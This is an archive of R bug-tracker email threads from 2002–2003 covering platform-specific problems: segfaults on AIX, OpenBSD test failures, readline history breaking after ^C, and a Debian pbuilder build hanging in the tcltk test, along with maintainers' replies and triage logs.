 o//o        e-mail: suport@cepba.upc.es           Fax: +34-93-401 25 77
o//o  CEPBA  c/Jordi Girona, 1-3, Mòdul D6. E-08034 Barcelona, Catalunya
________________________________________________________________________

The optimist thinks that this is the best of all possible worlds,
and the pessimist knows it.
-- J. Robert Oppenheimer, "Bulletin of Atomic Scientists"

We scientists, whose tragic destiny it has been to make the methods
of annihilation ever more gruesome and more effective, must consider
it our solemn and transcendent duty to do all in our power in
preventing these weapons from being used for the brutal purpose for
which they were invented.
-- Albert Einstein,       "Bulletin of Atomic Scientists"

==> 1289.reply.1 <==
From p.dalgaard@biostat.ku.dk Mon May  5 18:24:11 2003
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h45GOB2b016170;
	Mon, 5 May 2003 18:24:11 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (localhost.localdomain [127.0.0.1])
	by blueberry.kubism.ku.dk (8.12.8/8.12.8) with ESMTP id h45GSY8e007928;
	Mon, 5 May 2003 18:28:34 +0200
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.12.8/8.12.8/Submit) id h45GSXs7007924;
	Mon, 5 May 2003 18:28:33 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: harald@cepba.upc.es
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] (PR#1289)
References: <200305051553.h45Fro2b016035@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 05 May 2003 18:28:33 +0200
In-Reply-To: <200305051553.h45Fro2b016035@pubhealth.ku.dk>
Message-ID: <x2he89bbny.fsf@biostat.ku.dk>
Lines: 26
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

harald@cepba.upc.es writes:

> Dear all,
> 
> I've found a bug report for R when installing it on an AIX5.1 system.
> There's a followup (number 4) that comments a segmentation fault on R
> when quitting "q()".
> 
> I'm using a newer version of R but on the same operating system and
> I obtain the same error.
> 
> There was a way to solve this problem?

Well, some exact version numbers and bug report ditto might help
someone help you. 

Remember: *You* have a problem. People may actually go out of their
way to help you, but if they have to do detective work just to guess
your setup or figure out which PR# you're referring to, then they
might not bother.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1289.followup.6 <==
From harald@cepba.upc.es Mon May  5 18:39:17 2003
Received: from dukas.upc.es (dukas.upc.es [147.83.2.62])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h45GdG2b016236;
	Mon, 5 May 2003 18:39:17 +0200 (MET DST)
Received: from amen.cepba.upc.es (amen.cepba.upc.es [147.83.42.19])
	by dukas.upc.es (8.12.1/8.12.1) with ESMTP id h45Gd99J019653;
	Mon, 5 May 2003 18:39:09 +0200 (MET DST)
Received: from cepba.upc.es (amen.cepba.upc.es [147.83.42.19])
	by amen.cepba.upc.es (SGI-8.9.3/8.9.3) with ESMTP id SAA52701;
	Mon, 5 May 2003 18:40:07 +0200 (CEST)
Sender: harald@cepba.upc.es
Message-ID: <3EB693E6.CF360C1E@cepba.upc.es>
Date: Mon, 05 May 2003 18:40:07 +0200
From: Harald Servat Gelabert <harald@cepba.upc.es>
X-Mailer: Mozilla 4.77C-SGI [en] (X11; I; IRIX64 6.5 IP28)
X-Accept-Language: en
MIME-Version: 1.0
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
CC: R-bugs@biostat.ku.dk
Subject: Re: [Rd] (PR#1289)
References: <200305051553.h45Fro2b016035@pubhealth.ku.dk> <x2he89bbny.fsf@biostat.ku.dk>
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit

Ups, sorry, I forgot it. I thought that referencing the request
could be enough.

I'm trying to compile R 1.6.0, 1.6.1 and 1.6.2, and they all fail
on the same manner. With R 1.7.0 we have some problems for compiling
it.

I use GNU C version 3.1 and the G77 in the same package.

As I mentioned we have an AIX5.1 operating system running on a 
cluster of Power3 cpus.

When I launch R on the machine and quit from it, it makes a 
segmentation fault and core dumps.

Now I remember, when I tried to compile with XLC/XLF there were
several warning on a SETJMP or similar but this compiler didn't
fail on that point. (XLC failed when was unable to locate the
symbol __fixsfsi)


Best regards and thanks,


Peter Dalgaard BSA wrote:
> 
> harald@cepba.upc.es writes:
> 
> > Dear all,
> >
> > I've found a bug report for R when installing it on an AIX5.1 system.
> > There's a followup (number 4) that comments a segmentation fault on R
> > when quitting "q()".
> >
> > I'm using a newer version of R but on the same operating system and
> > I obtain the same error.
> >
> > There was a way to solve this problem?
> 
> Well, some exact version numbers and bug report ditto might help
> someone help you.
> 
> Remember: *You* have a problem. People may actually go out of their
> way to help you, but if they have to do detective work just to guess
> your setup or figure out which PR# you're referring to, then they
> might not bother.
> 
> --
>    O__  ---- Peter Dalgaard             Blegdamsvej 3
>   c/ /'_ --- Dept. of Biostatistics     2200 Cph. N
>  (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
> ~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

-- 
________________________________________________________________________
             Harald Servat Gelabert (harald@cepba.upc.es)
   o//o      Centre Europeu de Paral.lelisme de Barcelona          CEPBA
  o//o       WWW...: http://www.cepba.upc.es       Tel: +34-93-401 74 23
 o//o        e-mail: suport@cepba.upc.es           Fax: +34-93-401 25 77
o//o  CEPBA  c/Jordi Girona, 1-3, Mòdul D6. E-08034 Barcelona, Catalunya
________________________________________________________________________

The optimist thinks that this is the best of all possible worlds,
and the pessimist knows it.
-- J. Robert Oppenheimer, "Bulletin of Atomic Scientists"

We scientists, whose tragic destiny it has been to make the methods
of annihilation ever more gruesome and more effective, must consider
it our solemn and transcendent duty to do all in our power in
preventing these weapons from being used for the brutal purpose for
which they were invented.
-- Albert Einstein,       "Bulletin of Atomic Scientists"

==> 1289.followup.7 <==
From hornik@ci.tuwien.ac.at Tue May  6 16:58:04 2003
Received: from isis.wu-wien.ac.at (isis.wu-wien.ac.at [137.208.3.42])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h46Ew32b027362
	for <R-bugs@biostat.ku.dk>; Tue, 6 May 2003 16:58:03 +0200 (MET DST)
Received: from mithrandir.hornik.net (mail@wu057056.wu-wien.ac.at [137.208.57.56])
	by isis.wu-wien.ac.at (8.12.8/8.12.6) with ESMTP id h46Ew0Tn044656;
	Tue, 6 May 2003 16:58:00 +0200
	(envelope-from hornik@ci.tuwien.ac.at)
Received: from hornik by mithrandir.hornik.net with local (Exim 3.36 #1 (Debian))
	id 19Clsx-0000Rf-00; Mon, 05 May 2003 21:44:27 +0200
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <16054.48923.85323.827671@mithrandir.hornik.net>
Date: Mon, 5 May 2003 21:44:27 +0200
To: harald@cepba.upc.es
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] (PR#1289)
In-Reply-To: <200305051639.h45GdM2b016240@pubhealth.ku.dk>
References: <200305051639.h45GdM2b016240@pubhealth.ku.dk>
X-Mailer: VM 7.14 under Emacs 21.2.1
Reply-To: Kurt.Hornik@wu-wien.ac.at
From: Kurt Hornik <hornik@ci.tuwien.ac.at>
X-WU-uvscan-status: clean v4.2.40/v4261 charon fd6b3731df670a75451c59f40c1e76a4

>>>>> harald  writes:

> Ups, sorry, I forgot it. I thought that referencing the request
> could be enough.

> I'm trying to compile R 1.6.0, 1.6.1 and 1.6.2, and they all fail
> on the same manner. With R 1.7.0 we have some problems for compiling
> it.

> I use GNU C version 3.1 and the G77 in the same package.

> As I mentioned we have an AIX5.1 operating system running on a 
> cluster of Power3 cpus.

> When I launch R on the machine and quit from it, it makes a 
> segmentation fault and core dumps.

It might be helpful if you could debug this ...

Btw, I think the usual recommendation is using GCC 3.0 or 3.2, but not
3.1.

-k
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1316 *
Subject: shared libraries on AIX
From: lio@hpss1.ccs.ornl.gov
Date: Mon, 18 Feb 2002 18:53:41 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1316 <==
From lio@hpss1.ccs.ornl.gov  Mon Feb 18 18:53:43 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA04410
	for <R-bugs@biostat.ku.dk>; Mon, 18 Feb 2002 18:53:41 +0100 (MET)
Date: Mon, 18 Feb 2002 18:53:41 +0100 (MET)
From: lio@hpss1.ccs.ornl.gov
Message-Id: <200202181753.SAA04410@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: shared libraries on AIX

Full_Name: Daniel L. Million
Version: 1.4.1
OS: AIX 4.3.3/5.1
Submission from: (NULL) (160.91.192.125)


R almost works if I build on AIX without the R shared library (except for
crashing
on exit and a few other anomalies).  I can't get it to do much at all if I
build
with --enable-R-shlib.

For example, it won't load the X11 driver.  I ran R in a debugger and traced it
down to the point where R_load_X11_shlib successfully loads the R_X11.so
library
and calls R_init_X11.  This calls R_setX11Routines in src/unix/X11.c.  On entry

to this function, ptr_X11DeviceDriver = 0x2002eb20 and dev = 0x2014ba08.  After
the statement

    ptr_X11DeviceDriver = dev;

is executed, ptr_X11DeviceDriver remains unchanged at 0x2002eb20 !!  So when I
type "X11()" at the R prompt, all I ever get is the stub message, "the x11
device
has not been loaded".

I don't know enough about how shared libraries interact to understand why this
pointer is apparently write-protected.  I'm hoping someone here can give me a
clue.

Dan


==> 1316.audit <==
Tue Feb 19 10:13:59 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1461 *
Subject: make check fails d-p-q-r-tests.R - OpenBSD 3.0
From: Jason Turner <jasont@indigoindustrial.co.nz>
Date: Mon, 15 Apr 2002 10:13:36 +0000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1461 <==
From postmaster@franz.stat.wisc.edu  Mon Apr 15 12:12:38 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA07647
	for <r-bugs@biostat.ku.dk>; Mon, 15 Apr 2002 12:12:37 +0200 (MET DST)
Received: from pcp-2.ihug.co.nz (really [203.109.252.66]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16x3Sh-000IamC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Mon, 15 Apr 2002 05:11:51 -0500 (CDT) 
Received: from 203-173-247-235.nzwide.ihug.co.nz (camille.indigoindustrial.co.nz) [203.173.247.235] 
	by pcp-2.ihug.co.nz with esmtp (Exim 3.22 #1 (Debian))
	id 16x3Sc-0000Ba-00; Mon, 15 Apr 2002 22:11:46 +1200
Received: (from jasont@localhost)
	by camille.indigoindustrial.co.nz (8.9.3/8.9.3) id WAA07569
	for r-bugs@r-project.org; Mon, 15 Apr 2002 22:13:36 +1200
Date: Mon, 15 Apr 2002 10:13:36 +0000
From: Jason Turner <jasont@indigoindustrial.co.nz>
To: r-bugs@r-project.org
Subject: make check fails d-p-q-r-tests.R - OpenBSD 3.0
Message-ID: <20020415101336.A7551@camille.indigoindustrial.co.nz>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
X-mailer: mutt 1.2.5i
X-Priority: Booga booga
X-FOTD: Persimmon

Found one that stumped me.  I did a search on R-bugs for the
string "d-p-q-r-tests", and found zero entries in all categories 
(I don't think I secretly gave it a regex).

Did the usual configure, make, make check on OpenBSD 3.0, and 
encountered this message on d-p-q-r-tests.Rout:

running code in `d-p-q-r-tests.R' ... OK
comparing `d-p-q-r-tests.Rout' to `./d-p-q-r-tests.Rout.save' ...251,253c251
< [1] "`is.NA' value mismatches: 800 in current, 0  in target"
< Warning message:
< NaNs produced in: exp(pab <- dbeta(p, a, b, log = TRUE))
---
> [1] TRUE
315,317c313
< [1] "`is.NA' value mismatches: 4 in current, 2  in target"
< Warning message:
< NaNs produced in: exp(z)
---
> [1] TRUE
 OK

If you're not too busy, I'd love to provide you with whatever you
need to look at this more closely than my untrained eyes can.
config.cache?  d-p-q-r-tests.Rout?  Anything else?

> version
         _
	 platform i386-unknown-openbsd3.0
	 arch     i386
	 os       openbsd3.0
	 system   i386, openbsd3.0
	 status
	 major    1
	 minor    4.1
	 year     2002
	 month    01
	 day      30
	 language R


Cheers

Jason
-- 
Indigo Industrial Controls Ltd.
64-21-343-545
jasont@indigoindustrial.co.nz

==> 1461.reply.1 <==
From maechler@stat.math.ethz.ch  Mon Apr 15 12:46:41 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA07975
	for <R-bugs@biostat.ku.dk>; Mon, 15 Apr 2002 12:46:38 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id MAA17444;
	Mon, 15 Apr 2002 12:45:47 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa004GV; Mon Apr 15 12:45:43 2002
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id g3FAjYB22782;
	Mon, 15 Apr 2002 12:45:34 +0200
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15546.44877.955999.520989@gargle.gargle.HOWL>
Date: Mon, 15 Apr 2002 12:45:33 +0200
To: jasont@indigoindustrial.co.nz
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] make check fails d-p-q-r-tests.R - OpenBSD 3.0 (PR#1461)
In-Reply-To: <200204151012.MAA07652@pubhealth.ku.dk>
References: <200204151012.MAA07652@pubhealth.ku.dk>
X-Mailer: VM 6.97 under Emacs 21.1.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

>>>>> "Jason" == Jason Turner <jasont@indigoindustrial.co.nz> writes:

    Jason> Found one that stumped me.  I did a search on R-bugs for the
    Jason> string "d-p-q-r-tests", and found zero entries in all categories 
    Jason> (I don't think I secretly gave it a regex).

    Jason> Did the usual configure, make, make check on OpenBSD 3.0, and 
    Jason> encountered this message on d-p-q-r-tests.Rout:

    Jason> running code in `d-p-q-r-tests.R' ... OK
    Jason> comparing `d-p-q-r-tests.Rout' to `./d-p-q-r-tests.Rout.save' ...251,253c251
    Jason> < [1] "`is.NA' value mismatches: 800 in current, 0  in target"
    Jason> < Warning message:
    Jason> < NaNs produced in: exp(pab <- dbeta(p, a, b, log = TRUE))
    Jason> ---
    >> [1] TRUE
    Jason> 315,317c313
    Jason> < [1] "`is.NA' value mismatches: 4 in current, 2  in target"
    Jason> < Warning message:
    Jason> < NaNs produced in: exp(z)
    Jason> ---
    >> [1] TRUE
    Jason> OK

    Jason> If you're not too busy, I'd love to provide you with whatever you
    Jason> need to look at this more closely than my untrained eyes can.
    Jason> config.cache?  d-p-q-r-tests.Rout?  Anything else?

Actually, we'd be very grateful if you could run these with
R-devel aka "R pre1.5.0" instead.

You can get a snapshot using rsync (or the tar file), see
    http://stat.ethz.ch/CRAN/sources.html

If you see the same problem (or also with 1.4.1)
look at the tests/d-p-q files
probably start R and try things like

 z <- c(-Inf,Inf,NA,NaN, rt(1000, df=2))
 z.ok <- z > -37.5 | !is.finite(z)
 for(df in 1:10)
    if(!is.logical(all.equal(pt(z, df), 1 - pt(-z,df), tol= 1e-15)))
      cat("ERROR -- df = ", df, "\n")

 c(pz <- pnorm(z), 1 - pnorm(z, lower=FALSE))
 c(pz, pnorm(-z, lower=FALSE))
 c(log(pz[z.ok]),  pnorm(z[z.ok], log=TRUE))


because these are around line 315 of tests/d-p-q-r-tests.Rout.save
and the second problem happened around there.

[A more desperate option would be to offer a login into your computer to
 someone from the R core team ...]

Thanks for helping us to have R running correctly on OpenBSD 3.0,
Martin

==> 1461.audit <==
Thu Apr 18 15:35:18 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1606 *
Subject: hitting ^C breaks readline history
From: Cyril Humbert <humbertc@univ-mlv.fr>
Date: Tue, 28 May 2002 12:07:07 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1606 <==
From humbertc@univ-mlv.fr  Tue May 28 12:07:07 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA25460
	for <R-bugs@biostat.ku.dk>; Tue, 28 May 2002 12:07:07 +0200 (MET DST)
Date: Tue, 28 May 2002 12:07:07 +0200 (MET DST)
Message-Id: <200205281007.MAA25460@pubhealth.ku.dk>
From: Cyril Humbert <humbertc@univ-mlv.fr>
To: R-bugs@biostat.ku.dk
Subject: hitting ^C breaks readline history

Full_Name: Cyril Humbert
Version: 1.5.0
OS: linux
Submission from: (NULL) (193.50.159.2)


Hitting ^C breaks readline history (when R is stared in an xterm).

xterm -e R
^C    -> arrow key and history stop working.
For example, up-arrow gives "^[[A".

ldd ./R.bin 
    [../..]
    libreadline.so.4.1 => /usr/lib/libreadline.so.4.1 (0x40020000)
    libncurses.so.5 => /usr/lib/libncurses.so.5 (0x4004c000)
    [../..]

libncurses version is 5.2.
Note. I've got the same problem with libreadline.so.4.2.

==> 1606.reply.1 <==
From p.dalgaard@biostat.ku.dk  Tue May 28 14:32:35 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA27572;
	Tue, 28 May 2002 14:32:34 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g4SCWVh01560;
	Tue, 28 May 2002 14:32:31 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: humbertc@univ-mlv.fr
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: hitting ^C breaks readline history (PR#1606)
References: <200205281007.MAA25465@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 28 May 2002 14:32:31 +0200
In-Reply-To: <200205281007.MAA25465@pubhealth.ku.dk>
Message-ID: <x28z64fo68.fsf@blueberry.kubism.ku.dk>
Lines: 18
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

humbertc@univ-mlv.fr writes:

> Hitting ^C breaks readline history (when R is stared in an xterm).
> 
> xterm -e R
> ^C    -> arrow key and history stop working.
> For example, up-arrow gives "^[[A".

Yes, I've noticed as well. However, press Enter and things return to
normal.

If you give us a clue as to what causes the problem, we might fix it...

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1606.followup.1 <==
From cyril@univ-mlv.fr  Tue May 28 14:49:35 2002
Received: from univ-mlv.fr (goodboys.univ-mlv.fr [193.50.159.2])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA27857;
	Tue, 28 May 2002 14:49:34 +0200 (MET DST)
Received: from cyril by univ-mlv.fr with local (Exim 3.20 #1)
	id 17CgPD-0006St-00; Tue, 28 May 2002 14:48:51 +0200
Date: Tue, 28 May 2002 14:48:50 +0200
From: Cyril Humbert <humbertc@univ-mlv.fr>
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: hitting ^C breaks readline history (PR#1606)
Message-ID: <20020528144850.A24847@borneo.univ-mlv.fr>
References: <200205281007.MAA25465@pubhealth.ku.dk> <x28z64fo68.fsf@blueberry.kubism.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
In-Reply-To: <x28z64fo68.fsf@blueberry.kubism.ku.dk>; from p.dalgaard@biostat.ku.dk on Tue, May 28, 2002 at 02:32:31PM +0200
Sender: Cyril Humbert <cyril@univ-mlv.fr>

Peter Dalgaard BSA wrote:
> humbertc@univ-mlv.fr writes:
> 
> > Hitting ^C breaks readline history (when R is stared in an xterm).
> > 
> > xterm -e R
> > ^C    -> arrow key and history stop working.
> > For example, up-arrow gives "^[[A".
> 
> Yes, I've noticed as well. However, press Enter and things return to
> normal.

Thanks,
that's much better than my previous solution (quit and restart R).


> 
> If you give us a clue as to what causes the problem, we might fix it...

Probably something wrong with readline and/or ncurses but currently I
don't know exactly what...

-- 
Cyril Humbert 

==> 1606.audit <==
Mon Jun  3 20:57:41 2002	thomas	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2730 *
Subject: Re: Bug#187537: r-base: FTBFS: hangs in tcltk test
From: Dirk Eddelbuettel <edd@debian.org>
Date: Fri, 4 Apr 2003 06:27:15 -0600
--something obscure in debian: pbuilder is not part of R
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2730 <==
From edd@debian.org Fri Apr  4 14:27:17 2003
Received: from sonny.eddelbuettel.com (mail@12-250-182-80.client.attbi.com [12.250.182.80])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h34CRFpD008486
	for <r-bugs@biostat.ku.dk>; Fri, 4 Apr 2003 14:27:16 +0200 (MET DST)
Received: from edd by sonny.eddelbuettel.com with local (Exim 3.35 #1 (Debian))
	id 191QHr-000773-00; Fri, 04 Apr 2003 06:27:15 -0600
Date: Fri, 4 Apr 2003 06:27:15 -0600
From: Dirk Eddelbuettel <edd@debian.org>
To: r-bugs@biostat.ku.dk
Cc: Daniel Schepler <schepler@math.berkeley.edu>,
   187537-forwarded@bugs.debian.org
Subject: Re: Bug#187537: r-base: FTBFS: hangs in tcltk test
Message-ID: <20030404122715.GB27144@sonny.eddelbuettel.com>
References: <87n0j6rbjw.fsf@frobnitz.ddts.net>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <87n0j6rbjw.fsf@frobnitz.ddts.net>
User-Agent: Mutt/1.3.28i


Thanks for the bug report. I will pass it on to R Core.

On Thu, Apr 03, 2003 at 11:01:23PM -0800, Daniel Schepler wrote:
> Package: r-base
> Version: 1.6.2.cvs.20030403-1
> Severity: serious
> 
> Whenever I try to build r-base using pbuilder, it gets stuck at the
> following point:
> 
> ...
> collecting examples for package 'tcltk' ...
> make[6]: Entering directory `/tmp/buildd/r-base-1.6.2.cvs.20030403/src/library'
>  >>> Building/Updating help pages for package 'tcltk'
>      Formats: text example
> make[6]: Leaving directory `/tmp/buildd/r-base-1.6.2.cvs.20030403/src/library'
> running code in 'tcltk-Ex.R' ...
> 
> Part of the output of ps aufwwx reads:
> #1234     1727  0.0  0.1  2132 1000 pts/4    S    22:02   0:00                                                                              \_ /bin/sh -c ../../bin/R --vanilla < tcltk-Ex.R > tcltk-Ex.Rout 2>&1 || (mv tcltk-Ex.Rout tcltk-Ex.Rout.fail && exit 1)
> #1234     1728  0.1  2.6 24524 17004 pts/4   S    22:02   0:03                                                                                  \_ /tmp/buildd/r-base-1.6.2.cvs.20030403/bin/R.bin --vanilla
> #1234     1731  0.0  0.0     0    0 pts/4    Z    22:02   0:00                                                                                      \_ [R.bin] <defunct>
> 
> strace -p 1728 doesn't show anything useful, but top shows no CPU
> being consumed by the process (which is strange).

Hm, I have not seen that. But Doug Bates mentioned something about building
remotely, and having had a problem.

I have never seen this, and am building both locally and remotely.

> In case this makes any difference, I am redirecting the stdout and
> stderr of pbuilder into a pipe, while leaving stdin unchanged.

Don't know, it may. But that does not propagate to what happens inside
pbuilder, i.e. in the processes started by it, does it? 

Most of the other build systems work, see
     http://buildd.debian.org/build.php?pkg=r-base
The most recent hppa error looks spurious and related to Build-Depends.

Just to confirm, you are building on m68k, correct?  

Dirk


-- 
Wishful thinking can dominate much of the work of a profession for a decade,
but not indefinitely.   -- Robert Shiller, on Efficient Markets models, 2002

==> 2730.audit <==
Wed Apr  9 13:01:29 2003	ripley	moved from incoming to System-specific
Wed Apr  9 13:03:16 2003	ripley	changed notes
Wed Apr  9 13:03:16 2003	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2733 *
Subject: Re: Bug#187537: r-base: FTBFS: hangs in tcltk test
From: Daniel Schepler <schepler@math.berkeley.edu>
Date: 05 Apr 2003 14:06:09 -0800
--part of 2730
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2733 <==
From daniel@frobnitz.ddts.net Sun Apr  6 00:06:19 2003
Received: from smtp6.mindspring.com (smtp6.mindspring.com [207.69.200.110])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h35M6IpD015848
	for <r-bugs@biostat.ku.dk>; Sun, 6 Apr 2003 00:06:19 +0200 (MET DST)
Received: from user-119bq03.biz.mindspring.com ([66.149.232.3] helo=frobnitz.ddts.net)
	by smtp6.mindspring.com with esmtp (Exim 3.33 #1)
	id 191vne-0007aZ-00; Sat, 05 Apr 2003 17:06:10 -0500
Received: from daniel by frobnitz.ddts.net with local (Exim 3.36 #1 (Debian))
	id 191vnd-0000WI-00; Sat, 05 Apr 2003 14:06:09 -0800
To: Dirk Eddelbuettel <edd@debian.org>
Cc: r-bugs@biostat.ku.dk, 187537@bugs.debian.org
Subject: Re: Bug#187537: r-base: FTBFS: hangs in tcltk test
References: <87n0j6rbjw.fsf@frobnitz.ddts.net>
	<20030404122715.GB27144@sonny.eddelbuettel.com>
Content-Type: text/plain; charset=US-ASCII
From: Daniel Schepler <schepler@math.berkeley.edu>
Date: 05 Apr 2003 14:06:09 -0800
In-Reply-To: <20030404122715.GB27144@sonny.eddelbuettel.com>
Message-ID: <87of3kioq6.fsf@frobnitz.ddts.net>
Lines: 29
User-Agent: Gnus/5.0808 (Gnus v5.8.8) XEmacs/21.4 (Portable Code)
MIME-Version: 1.0
Sender: Daniel Schepler <daniel@frobnitz.ddts.net>

Dirk Eddelbuettel <edd@debian.org> writes:

> Thanks for the bug report. I will pass it on to R Core.
>
> > In case this makes any difference, I am redirecting the stdout and
> > stderr of pbuilder into a pipe, while leaving stdin unchanged.
> 
> Don't know, it may. But that does not propagate to what happens inside
> pbuilder, i.e. in the processes started by it, does it? 
> 
> Most of the other build systems work, see
>      http://buildd.debian.org/build.php?pkg=r-base
> The most recent hppa error looks spurious and related to Build-Depends.

I just reproduced the hang on a standard pbuilder setup: after
installing pbuilder and editing MIRRORSITE in /etc/pbuilderrc to your
liking and setting DISTRIBUTION to sid, you should just be able to run
pbuilder create, then "pbuilder build r-base_*.dsc 2>&1|tee
build-log".  This reproduced the bug for me.  (I'm not sure whether
pbuilder is actually required, but I didn't feel like installing the
Build-Depends for r-base in the root filesystem.)

> Just to confirm, you are building on m68k, correct?  

No, i386.
-- 
Daniel Schepler              "Please don't disillusion me.  I
schepler@math.berkeley.edu    haven't had breakfast yet."
                                 -- Orson Scott Card

==> 2733.audit <==
Wed Apr  9 13:01:29 2003	ripley	moved from incoming to System-specific
Wed Apr  9 13:02:35 2003	ripley	changed notes
Wed Apr  9 13:02:35 2003	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2736 *
Subject: Re: Bug#187537: r-base: FTBFS: hangs in tcltk test
From: Dirk Eddelbuettel <edd@debian.org>
Date: Sun, 6 Apr 2003 21:20:29 -0500
--part of 2730
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2736 <==
From edd@debian.org Mon Apr  7 04:20:30 2003
Received: from sonny.eddelbuettel.com (mail@12-250-182-80.client.attbi.com [12.250.182.80])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h372KTpD019834
	for <r-bugs@biostat.ku.dk>; Mon, 7 Apr 2003 04:20:29 +0200 (MET DST)
Received: from edd by sonny.eddelbuettel.com with local (Exim 3.35 #1 (Debian))
	id 192MFK-0004Yc-00; Sun, 06 Apr 2003 21:20:30 -0500
Date: Sun, 6 Apr 2003 21:20:29 -0500
From: Dirk Eddelbuettel <edd@debian.org>
To: Daniel Schepler <schepler@math.berkeley.edu>
Cc: Dirk Eddelbuettel <edd@debian.org>, r-bugs@biostat.ku.dk,
   187537@bugs.debian.org
Subject: Re: Bug#187537: r-base: FTBFS: hangs in tcltk test
Message-ID: <20030407022029.GA17494@sonny.eddelbuettel.com>
References: <87n0j6rbjw.fsf@frobnitz.ddts.net> <20030404122715.GB27144@sonny.eddelbuettel.com> <87of3kioq6.fsf@frobnitz.ddts.net>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
